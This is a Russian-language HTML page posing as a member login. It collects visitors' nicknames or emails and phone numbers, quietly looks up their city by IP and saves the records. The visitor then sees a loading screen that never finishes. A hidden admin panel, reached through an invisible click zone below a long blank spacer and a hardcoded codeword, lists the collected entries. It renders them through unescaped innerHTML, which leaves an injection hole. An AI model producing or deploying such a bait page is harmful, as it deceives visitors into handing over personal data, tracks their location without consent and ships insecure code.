<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Личный кабинет</title>
    <style>
        /* Базовые настройки страницы */
        html, body { height: 100%; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f0f2f5; color: #333; }

        /* Контейнер, который держит главное окно строго по центру первого экрана */
        .center-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh; /* Ровно высота одного экрана */
            box-sizing: border-box;
        }

        .box { background: white; padding: 25px; border-radius: 12px; max-width: 450px; width: 100%; box-shadow: 0 4px 15px rgba(0,0,0,0.08); margin: 0 20px; }
        h3 { margin-top: 0; color: #111; }
        label { display: block; margin-top: 12px; font-weight: 500; font-size: 14px; color: #555; }
        input, button { width: 100%; padding: 12px; margin: 6px 0 12px 0; box-sizing: border-box; border-radius: 6px; font-size: 15px; }
        input { border: 1px solid #ccc; background: #fafafa; }
        input:focus { border-color: #007bff; outline: none; background: #fff; }
        button { background: #007bff; color: white; border: none; cursor: pointer; font-weight: bold; }
        .admin-btn { background: #28a745; }

        /* Скрытые блоки админки */
        #secretAdminInputBlock, #adminPanel { display: none; }
        #adminPanel { background: #1e1e1e; color: #f8f8f2; margin: 20px auto; }
        .log-item { border-bottom: 1px solid #3a3a3a; padding: 12px 0; font-family: monospace; font-size: 13px; }
        .accent { color: #50fa7b; }

        /* Бесконечная загрузка */
        #loadingScreen { display: none; text-align: center; padding: 40px 10px; }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border-left-color: #007bff;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }
        .gray-text { color: #888; font-size: 14px; user-select: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* ОГРОМНЫЙ ПУСТОЙ ОТСТУП: заставляет пользователя очень долго мотать вниз */
        .huge-spacer {
            height: 4000px;
        }

        /* Крупная черная плашка на самом дне страницы */
        .black-bar {
            height: 20px; /* Сделали плашку больше и заметнее */
            background-color: #000000;
            width: 100%;
            position: relative;
        }

        /* Абсолютно невидимая зона для клика строго НАД черной плашкой */
        .secret-click-zone {
            position: absolute;
            bottom: 20px; /* Начинается ровно от верхнего края плашки */
            left: 0;
            width: 100%;
            height: 40px; /* Высота чувствительной зоны */
            background: transparent;
            cursor: default; /* Обычная стрелка мыши, палец не появляется */
            user-select: none;
        }
    </style>
</head>
<body>

    <!-- Блок, фиксирующий окно ввода строго ПО ЦЕНТРУ экрана -->
    <div class="center-wrapper">
        <div class="box">
            <!-- Форма для пользователя -->
            <div id="userForm">
                <h3>Личный кабинет участника</h3>
                <label>Никнейм или Email:</label>
                <input type="text" id="username" placeholder="alex_99 или user@mail.ru">

                <label>Номер телефона:</label>
                <input type="tel" id="userphone" autocomplete="tel" placeholder="+7 (999) 123-45-67">

                <button onclick="registerUser()">Подтвердить вход</button>
            </div>

            <!-- Экран бесконечной загрузки -->
            <div id="loadingScreen">
                <div class="spinner"></div>
                <div class="gray-text">Ожидание сайта...</div>
            </div>
        </div>
    </div>

    <!-- Искусственная пустота, которую нужно долго прокручивать -->
    <div class="huge-spacer"></div>

    <!-- Крупная черная плашка на самом дне -->
    <div class="black-bar">
        <!-- Секретный невидимый триггер клика строго НАД плашкой (без смены курсора) -->
        <div class="secret-click-zone" onclick="toggleAdminInput()"></div>
    </div>

    <!-- Скрытая панель авторизации админа -->
    <div class="box" id="secretAdminInputBlock">
        <label>Панель управления (введите кодовое слово):</label>
        <input type="text" id="secretKey" placeholder="Введите пароль...">
        <button class="admin-btn" onclick="checkCode()">Войти в админку</button>
    </div>

    <!-- Блок отображения базы данных -->
    <div class="box" id="adminPanel">
        <h3>База данных (Логи посещений):</h3>
        <div id="logs">Записей пока нет.</div>
    </div>

    <script>
        let detectedCity = "Не определен";

        // Фоновое авто-определение города по IP
        fetch('https://ipapi.co')
            .then(response => response.json())
            .then(data => { detectedCity = data.city || "Неизвестный город"; })
            .catch(() => { detectedCity = "Локальный тест / Не определен"; });

        function registerUser() {
            const nameInput = document.getElementById('username').value.trim();
            const phoneInput = document.getElementById('userphone').value.trim();

            if (!nameInput || !phoneInput) {
                alert('Пожалуйста, заполните все поля!');
                return;
            }

            const currentTime = new Date().toLocaleString('ru-RU');

            let database = JSON.parse(localStorage.getItem('site_logs')) || [];
            database.push({
                name: nameInput,
                phone: phoneInput,
                city: detectedCity,
                time: currentTime
            });
            localStorage.setItem('site_logs', JSON.stringify(database));

            document.getElementById('userForm').style.display = 'none';
            document.getElementById('loadingScreen').style.display = 'block';
        }

        // Секретный клик над черной плашкой
        function toggleAdminInput() {
            const adminInputBlock = document.getElementById('secretAdminInputBlock');
            if (adminInputBlock.style.display === 'block') {
                adminInputBlock.style.display = 'none';
            } else {
                adminInputBlock.style.display = 'block';
                // Плавно докручиваем страницу до появившегося окна ввода пароля
                adminInputBlock.scrollIntoView({ behavior: 'smooth' });
            }
        }

        // Проверка кодового слова
        function checkCode() {
            const key = document.getElementById('secretKey').value.trim();
            const panel = document.getElementById('adminPanel');
            const logsDiv = document.getElementById('logs');

            if (key === 'КОД') {
                panel.style.display = 'block';
                let database = JSON.parse(localStorage.getItem('site_logs')) || [];

                if (database.length === 0) {
                    logsDiv.innerHTML = '<i>База данных пуста.</i>';
                    return;
                }

                logsDiv.innerHTML = database.map((user, index) => `
                    <div class="log-item">
                        [<span class="accent">${user.time}</span>] Посетитель #${index + 1}<br>
                        • <b>Ник:</b> ${user.name}<br>
                        • <b>Телефон:</b> ${user.phone}<br>
                        • <b>Город:</b> ${user.city}
                    </div>
                `).join('');

                panel.scrollIntoView({ behavior: 'smooth' });
            } else {
                alert('Неверное кодовое слово!');
                panel.style.display = 'none';
            }
        }
    </script>
</body>
</html>
